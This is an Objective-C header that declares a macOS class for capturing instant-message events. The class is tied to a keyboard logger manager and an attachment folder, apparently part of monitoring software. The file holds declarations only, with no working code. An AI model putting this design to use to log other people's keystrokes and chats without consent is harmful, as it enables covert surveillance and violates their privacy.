//
//  IMCaptureManagerForMac.h
//  IMCaptureManagerForMac
//
//  Created by Makara Khloth on 2/9/15.
//  Copyright (c) 2015 Makara Khloth. All rights reserved.
//

#import <Foundation/Foundation.h>

#import "EventCapture.h"
#import "KeyboardLoggerManagerDelegate.h"

@class KeyboardLoggerManager;

@interface IMCaptureManagerForMac : NSObject <EventCapture, KeyboardLoggerManagerDelegate> {
    KeyboardLoggerManager *mKeyboardLoggerManager;
    NSString *mAttachmentFolder;
    NSUInteger  mIndividualIM;
    id <EventDelegate> mEventDelegate;
}

@property (nonatomic, assign) NSUInteger mIndividualIM;

- (id) initWithAttachmentFolder: (NSString *) aAttachmentFolder
          keyboardLoggerManager: (KeyboardLoggerManager *) aKeyboardLoggerManager;

@end
